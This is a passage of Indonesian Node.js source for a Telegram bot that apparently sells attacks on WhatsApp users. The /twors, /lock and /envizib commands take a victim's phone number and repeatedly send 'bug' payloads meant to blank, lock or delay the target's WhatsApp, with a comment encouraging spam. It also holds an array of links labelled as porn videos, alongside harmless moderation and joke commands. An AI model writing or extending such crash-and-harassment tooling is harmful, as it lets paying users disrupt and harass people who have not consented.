      } catch {
        await bot.sendMessage(chatId, errorText);
      }
    } else {
      await bot.sendMessage(chatId, errorText);
    }
  }
});

bot.onText(/\/twors (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userKey = String(senderId);

  // ---- Channel Verification Gate ----
  const channelAccess = await checkRequiredChannels(senderId);

  if (!channelAccess.joined) {
    const wasVerified = verifiedChannelUsers.has(userKey);
    const reason = channelAccess.errors?.length
      ? "error"
      : wasVerified
        ? "left"
        : "initial";

    if (wasVerified) {
      await removeStartMenu(senderId);
    }

    return showJoinPrompt(chatId, channelAccess, reason);
  }

  // Simpan status pernah terverifikasi
  markChannelVerified(senderId);

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const efek = "Blank Hard"; //ganti aja sesuai efeknya

  // ---- Role Access Gate ----
  const role = getUserRole(senderId);

  if (role === "Free") {
    return bot.sendPhoto(chatId, randomImage, {
      caption: privateAccessCaption(),
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Owner",
              url: "https://t.me/ridzzhalutrs"
            }
          ]
        ]
      }
    });
  }

  // ---- Cooldown Gate ----
  const remainingTime = checkCooldown(senderId);

  if (remainingTime > 0) {
    return bot.sendMessage(
      chatId,
      `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`
    );
  }

  // ---- Session Gate ----
  if (!sessions || sessions.size === 0) {
    return bot.sendMessage(
      chatId,
      "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
    );
  }

  const sock = [...sessions.values()][0].sock || [...sessions.values()][0];
  let sentMessage;

  try {
    sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: blankCaption(formattedNumber, "Initializing...", 0, efek),
      parse_mode: "HTML"
    });

    const stages = [
      { percent: 10, delay: 300 },
      { percent: 20, delay: 300 },
      { percent: 30, delay: 300 },
      { percent: 40, delay: 300 },
      { percent: 50, delay: 300 },
      { percent: 60, delay: 300 },
      { percent: 70, delay: 300 },
      { percent: 80, delay: 300 },
      { percent: 90, delay: 300 },
      { percent: 100, delay: 300 }
    ];

    for (const stage of stages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        blankCaption(
          formattedNumber,
          stage.percent === 100 ? "Executing Bug..." : "Processing...",
          stage.percent,
          efek
        ),
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML"
        }
      );
    }

    for (let i = 0; i <= 2; i++) {   
      await SXRV3(sock, jid);
      await SRXV4(sock, jid);
      await crashome(sock, jid);
      
      await new Promise(res => setTimeout(res, 2000)); // 2000 = 2 detik jeda per bug nya, ganti 1000 (1detik) untuk spam atau yang lainnya
    }
    
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `${blankCaption(formattedNumber, "Completed", 100, efek)}

<blockquote><b>✓ TASK FINISHED</b>
Proses ${efek} telah selesai.
<b>ALTHERA</b> — <i>EST. 2025</i></blockquote>`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            {
              text: "Cek Target",
              url: `https://wa.me/${formattedNumber}`
            }
          ]]
        }
      }
    );

  } catch (error) {
    console.error("[BLANK ERROR]", error);

    const errorText = "❌ Terjadi kesalahan saat menjalankan proses.";

    if (sentMessage) {
      try {
        await bot.editMessageCaption(
          blankCaption(formattedNumber, "Failed", 0, efek) + `\n\n<b>${errorText}</b>`,
          {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "HTML"
          }
        );
      } catch {
        await bot.sendMessage(chatId, errorText);
      }
    } else {
      await bot.sendMessage(chatId, errorText);
    }
  }
});

bot.onText(/\/lock (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userKey = String(senderId);

  // ---- Channel Verification Gate ----
  const channelAccess = await checkRequiredChannels(senderId);

  if (!channelAccess.joined) {
    const wasVerified = verifiedChannelUsers.has(userKey);
    const reason = channelAccess.errors?.length
      ? "error"
      : wasVerified
        ? "left"
        : "initial";

    if (wasVerified) {
      await removeStartMenu(senderId);
    }

    return showJoinPrompt(chatId, channelAccess, reason);
  }

  // Simpan status pernah terverifikasi
  markChannelVerified(senderId);

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const efek = "Lock Chat WhatsApp"; //ganti aja sesuai efeknya

  // ---- Role Access Gate ----
  const role = getUserRole(senderId);

  if (role === "Free") {
    return bot.sendPhoto(chatId, randomImage, {
      caption: privateAccessCaption(),
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Owner",
              url: "https://t.me/ridzzhalutrs"
            }
          ]
        ]
      }
    });
  }

  // ---- Cooldown Gate ----
  const remainingTime = checkCooldown(senderId);

  if (remainingTime > 0) {
    return bot.sendMessage(
      chatId,
      `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`
    );
  }

  // ---- Session Gate ----
  if (!sessions || sessions.size === 0) {
    return bot.sendMessage(
      chatId,
      "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
    );
  }

  const sock = [...sessions.values()][0].sock || [...sessions.values()][0];
  let sentMessage;

  try {
    sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: blankCaption(formattedNumber, "Initializing...", 0, efek),
      parse_mode: "HTML"
    });

    const stages = [
      { percent: 10, delay: 300 },
      { percent: 20, delay: 300 },
      { percent: 30, delay: 300 },
      { percent: 40, delay: 300 },
      { percent: 50, delay: 300 },
      { percent: 60, delay: 300 },
      { percent: 70, delay: 300 },
      { percent: 80, delay: 300 },
      { percent: 90, delay: 300 },
      { percent: 100, delay: 300 }
    ];

    for (const stage of stages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        blankCaption(
          formattedNumber,
          stage.percent === 100 ? "Executing Bug..." : "Processing...",
          stage.percent,
          efek
        ),
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML"
        }
      );
    }

    for (let i = 0; i <= 2; i++) {   
      await SXRV3(sock, jid);
      await SRXV4(sock, jid);
      await crashome(sock, jid);
      
      await new Promise(res => setTimeout(res, 2000)); // 2000 = 2 detik jeda per bug nya, ganti 1000 (1detik) untuk spam atau yang lainnya
    }
    
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `${blankCaption(formattedNumber, "Completed", 100, efek)}

<blockquote><b>✓ TASK FINISHED</b>
Proses ${efek} telah selesai.
<b>ALTHERA</b> — <i>EST. 2025</i></blockquote>`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            {
              text: "Cek Target",
              url: `https://wa.me/${formattedNumber}`
            }
          ]]
        }
      }
    );

  } catch (error) {
    console.error("[BLANK ERROR]", error);

    const errorText = "❌ Terjadi kesalahan saat menjalankan proses.";

    if (sentMessage) {
      try {
        await bot.editMessageCaption(
          blankCaption(formattedNumber, "Failed", 0, efek) + `\n\n<b>${errorText}</b>`,
          {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "HTML"
          }
        );
      } catch {
        await bot.sendMessage(chatId, errorText);
      }
    } else {
      await bot.sendMessage(chatId, errorText);
    }
  }
});

bot.onText(/\/envizib  (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userKey = String(senderId);

  // ---- Channel Verification Gate ----
  const channelAccess = await checkRequiredChannels(senderId);

  if (!channelAccess.joined) {
    const wasVerified = verifiedChannelUsers.has(userKey);
    const reason = channelAccess.errors?.length
      ? "error"
      : wasVerified
        ? "left"
        : "initial";

    if (wasVerified) {
      await removeStartMenu(senderId);
    }

    return showJoinPrompt(chatId, channelAccess, reason);
  }

  // Simpan status pernah terverifikasi
  markChannelVerified(senderId);

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const efek = "Delay Invisible"; //ganti aja sesuai efeknya

  // ---- Role Access Gate ----
  const role = getUserRole(senderId);

  if (role === "Free") {
    return bot.sendPhoto(chatId, randomImage, {
      caption: privateAccessCaption(),
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Owner",
              url: "https://t.me/ridzzhalutrs"
            }
          ]
        ]
      }
    });
  }

  // ---- Cooldown Gate ----
  const remainingTime = checkCooldown(senderId);

  if (remainingTime > 0) {
    return bot.sendMessage(
      chatId,
      `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`
    );
  }

  // ---- Session Gate ----
  if (!sessions || sessions.size === 0) {
    return bot.sendMessage(
      chatId,
      "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
    );
  }

  const sock = [...sessions.values()][0].sock || [...sessions.values()][0];
  let sentMessage;

  try {
    sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: blankCaption(formattedNumber, "Initializing...", 0, efek),
      parse_mode: "HTML"
    });

    const stages = [
      { percent: 10, delay: 300 },
      { percent: 20, delay: 300 },
      { percent: 30, delay: 300 },
      { percent: 40, delay: 300 },
      { percent: 50, delay: 300 },
      { percent: 60, delay: 300 },
      { percent: 70, delay: 300 },
      { percent: 80, delay: 300 },
      { percent: 90, delay: 300 },
      { percent: 100, delay: 300 }
    ];

    for (const stage of stages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        blankCaption(
          formattedNumber,
          stage.percent === 100 ? "Executing Bug..." : "Processing...",
          stage.percent,
          efek
        ),
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML"
        }
      );
    }

    for (let i = 0; i <= 2; i++) {   
      await SXRV3(sock, jid);
      await SRXV4(sock, jid);
      await crashome(sock, jid);
      
      await new Promise(res => setTimeout(res, 2000)); // 2000 = 2 detik jeda per bug nya, ganti 1000 (1detik) untuk spam atau yang lainnya
    }
    
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `${blankCaption(formattedNumber, "Completed", 100, efek)}

<blockquote><b>✓ TASK FINISHED</b>
Proses ${efek} telah selesai.
<b>ALTHERA</b> — <i>EST. 2025</i></blockquote>`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            {
              text: "Cek Target",
              url: `https://wa.me/${formattedNumber}`
            }
          ]]
        }
      }
    );

  } catch (error) {
    console.error("[BLANK ERROR]", error);

    const errorText = "❌ Terjadi kesalahan saat menjalankan proses.";

    if (sentMessage) {
      try {
        await bot.editMessageCaption(
          blankCaption(formattedNumber, "Failed", 0, efek) + `\n\n<b>${errorText}</b>`,
          {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "HTML"
          }
        );
      } catch {
        await bot.sendMessage(chatId, errorText);
      }
    } else {
      await bot.sendMessage(chatId, errorText);
    }
  }
});
// /TEMPAT FUNC DISINI ///


/// END FUNCTION LU DISINI ///
bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');

bot.onText(/\/setcd (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });

//case tools
bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];

  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});

bot.onText(/^\/unmute(?:\s+@?(\w+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  // hanya bisa di grup
  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "⚠️ Command ini hanya bisa dipakai di grup.");
  }

  // harus reply atau sebut username
  const repliedUser = msg.reply_to_message?.from;
  const username = match[1];
  let targetUser;

  if (repliedUser) {
    targetUser = repliedUser;
  } else if (username) {
    // ambil member dari username
    try {
      const members = await bot.getChatAdministrators(chatId);
      targetUser = members.find(m => m.user.username?.toLowerCase() === username.toLowerCase())?.user;
    } catch (e) {
      console.error("Gagal ambil member:", e.message);
    }
  }

  if (!targetUser) {
    return bot.sendMessage(chatId, "❌ Balas pesan user atau sebut username untuk unmute.");
  }

  try {
    await bot.restrictChatMember(chatId, targetUser.id, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: true,
        can_pin_messages: false
      }
    });

    bot.sendMessage(chatId, `✅ User [${targetUser.first_name}](tg://user?id=${targetUser.id}) sudah di-*unmute*.`, {
      parse_mode: "Markdown"
    });
  } catch (err) {
    console.error("Error unmute:", err.message);
    bot.sendMessage(chatId, "❌ Gagal unmute user. Pastikan bot punya izin admin.");
  }
});

bot.onText(/^\/mute$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    // Harus reply pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Balas pesan pengguna yang ingin di-mute.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah yang memanggil adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
        }

        // Mute user: hanya non-admin yang bisa dimute
        await bot.restrictChatMember(chatId, targetUser.id, {
            permissions: {
                can_send_messages: false,
                can_send_media_messages: false,
                can_send_polls: false,
                can_send_other_messages: false,
                can_add_web_page_previews: false,
                can_change_info: false,
                can_invite_users: false,
                can_pin_messages: false
            }
        });

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ Pengguna [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di-mute.`,
            { parse_mode: 'Markdown' });

        // Balas pesan yang dimute
        await bot.sendMessage(chatId,
            '🚫 *Pengguna telah di-mute di grup ini oleh admin.*',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat mute:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan mute.');
    }
});
const FormData = require("form-data");
 
// Daftar khodam
const khodam = [
  "Kulkas 2 pintu", "Kumis lele", "Kumis Lele", "Lemari dua Pintu", "Kacang Hijau",
  "Kulkas mini", "Burung beo", "Air", "Api", "Batu", "Magnet", "Sempak", "Botol Tupperware",
  "Badut Mixue", "Sabun GIV", "Sandal Swallow", "Jarjit", "Ijat", "Fizi", "Mail", "Ehsan",
  "Upin", "Ipin", "sungut lele", "Tok Dalang", "Opah", "Opet", "Alul", "Pak Vinsen",
  "Maman Resing", "Pak RT", "Admin ETI", "Bung Towel", "Lumpia Basah", "Bjorka", "Hacker",
  "Martabak Manis", "Baso Tahu", "Tahu Gejrot", "Dimsum", "Seblak", "Aromanis",
  "Gelembung sabun", "Kuda", "Seblak Ceker", "Telor Gulung", "Tahu Aci", "Tempe Mendoan",
  "Nasi Kucing", "Kue Cubit", "Tahu Sumedang", "Nasi Uduk", "Wedang Ronde", "Kerupuk Udang",
  "Cilok", "Cilung", "Kue Sus", "Jasuke", "Seblak Makaroni", "Sate Padang", "Sayur Asem",
  "Kromboloni", "Marmut Pink", "Belalang Mullet", "Kucing Oren", "Lintah Terbang",
  "Singa Paddle Pop", "Macan Cisewu", "Vario Mber", "Beat Mber", "Supra Geter",
  "Oli Samping", "Knalpot Racing", "Jus Stroberi", "Jus Alpukat", "Alpukat Kocok",
  "Es Kopyor", "Es Jeruk", "@whiskeysockets/baileys", "chalk", "gradient-string",
  "@adiwajshing", "d-scrape", "undefined", "cannot read properties", "performance-now",
  "os", "node-fetch", "form-data", "axios", "util", "fs-extra", "scrape-primbon",
  "child_process", "emoji-regex", "check-disk-space", "perf_hooks", "moment-timezone",
  "cheerio", "fs", "process", "require( . . . )", "import ... from ...", "rate-overlimit",
  "Cappucino Cincau", "Jasjus Melon", "Teajus Apel", "Pop ice Mangga", "Teajus Gulabatu",
  "Air Selokan", "Air Kobokan", "TV Tabung", "Keran Air", "Tutup Panci", "Kotak Amal",
  "Tutup Termos", "Tutup Botol", "Kresek Item", "Kepala Casan", "Ban Serep", "Kursi Lipat",
  "Kursi Goyang", "Kulit Pisang", "Warung Madura", "Gorong-gorong"
];

// Fungsi pilih khodam random
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())];
}

// Command: /cekkhodam <nama>
bot.onText(/^\/cekkhodam(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(chatId, "⚠️ Masukkan nama siapa yang mau di cek khodam-nya.\n\nContoh: `/cekkhodam Jamal`", {
      parse_mode: "Markdown"
    });
  }

  const kdm = pickRandom(khodam);
  const kodamn = `*Khodam ${text} adalah:* ${kdm}`;

  bot.sendMessage(chatId, kodamn, { parse_mode: "Markdown" });
});

const bokep = [
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/r3ip1j.mp4", 
  "https://files.catbox.moe/71l6bo.mp4", 
  "https://files.catbox.moe/rdggsh.mp4", 
  "https://files.catbox.moe/3288uf.mp4", 
  "https://files.catbox.moe/jdopgq.mp4", 
  "https://files.catbox.moe/8ca9cw.mp4", 
  "https://files.catbox.moe/b99qh3.mp4", 
  "https://files.catbox.moe/6bkokw.mp4", 
  "https://files.catbox.moe/ebisdh.mp4", 
  "https://files.catbox.moe/3yko44.mp4", 
  "https://files.catbox.moe/apqlvo.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/n37liq.mp4", 
  "https://files.catbox.moe/0728bg.mp4", 
  "https://files.catbox.moe/p69jdc.mp4", 
  "https://files.catbox.moe/occ3en.mp4", 
  "https://files.catbox.moe/y8hmau.mp4", 
  "https://files.catbox.moe/tvj95b.mp4", 
  "https://files.catbox.moe/3g2djb.mp4", 
  "https://files.catbox.moe/xlbafn.mp4", 
  "https://files.catbox.moe/br8crz.mp4", 
  "https://files.catbox.moe/h2w5jl.mp4", 
  "https://files.catbox.moe/8y32qo.mp4", 
  "https://files.catbox.moe/9w39ag.mp4", 
  "https://files.catbox.moe/gv4087.mp4", 
  "https://files.catbox.moe/uw6qbs.mp4", 
  "https://files.catbox.moe/a537h1.mp4", 
  "https://files.catbox.moe/4x09p9.mp4", 
  "https://files.catbox.moe/n992te.mp4", 
  "https://files.catbox.moe/ltdsbm.mp4", 
  "https://files.catbox.moe/rt62tl.mp4", 
  "https://files.catbox.moe/y4rote.mp4", 
  "https://files.catbox.moe/dxn5oj.mp4", 
  "https://files.catbox.moe/tw6m9q.mp4", 
  "https://files.catbox.moe/qfl235.mp4", 
  "https://files.catbox.moe/q9f2rs.mp4", 
  "https://files.catbox.moe/e5ci9z.mp4", 
  "https://files.catbox.moe/cdl11t.mp4", 
  "https://files.catbox.moe/pmyi1y.mp4" 
  ];
  
// Fungsi ambil random
function pickRandom(list) {
  return list[Math.floor(Math.random() * list.length)];
}

// Command /cekganteng
bot.onText(/^\/cekganteng(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const name = match[1];

  if (!name) {
    return bot.sendMessage(chatId, "⚠️ NAMA LU MANA??\nContoh:\n/cekganteng Rizky");
  }

  const ganteng = [
    "cuman 10% doang",
    "20% kurang ganteng soal nya",
    "0% karna nggak ganteng",
    "30% mayan gantengg",
    "40% ganteng",
    "50% Otw cari janda😎",
    "60% Orang Ganteng",
    "70% Ganteng bet",
    "80% gantengggg parah",
    "90% Ganteng idaman ciwi ciwi",
    "100% Ganteng Bgt bjirr"
  ];

  const hasil = ganteng[Math.floor(Math.random() * ganteng.length)];
  const teks = `𝗧𝗲𝗿𝗻𝘆𝗮𝘁𝗮 *${name}* ${hasil}`;

  bot.sendMessage(chatId, teks, { parse_mode: "Markdown" });
});

// ====== kata kata =====
const galau = [
    "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
    "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
    "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
    "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
    "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
    "Tak semudah itu melupakanmu",
    "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
    "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
    "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
    "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
    "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
    "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
    "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
    "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
    "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
    "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
    "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
    "Tolong jangan pergi saat aku sudah sangat sayang padamu",
    "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
    "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
    "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
    "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
    "Karenamu aku jadi tau cinta yang sesungguhnya",
    "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
    "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
    "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
    "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
    "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
    "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
    "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
    "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
    "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
    "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
    "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
    "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
    "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
    "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
    "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
    "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
    "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
    "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
    "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
    "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
    "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
    "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
    "Aku berdiri disini sendiri menunggu kehadiran dirimu",
    "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
    "Maaf aku lupa ternyata aku bukan siapa-siapa",
    "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
    "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
    "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
    "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
    "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
    "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
    "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
    "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
    "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
    "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
    "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
    "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
    "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
    "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
    "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
    "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
    "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
    "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
    "Dari sekian lama menunggu apa yang sudah didapat",
    "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
    "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
    "Aku terlahir sederhana dan ditinggal sudah biasa",
    "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
    "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
    "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
    "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
    "Jangan paksa aku menjadi cewek seperti seleramu",
    "Hanya yang sabar yang mampu melewati semua kekecewaan",
    "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
    "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
    "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
    "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
];

// Command: /quotesgalau
bot.onText(/^\/quotesgalau$/, (msg) => {
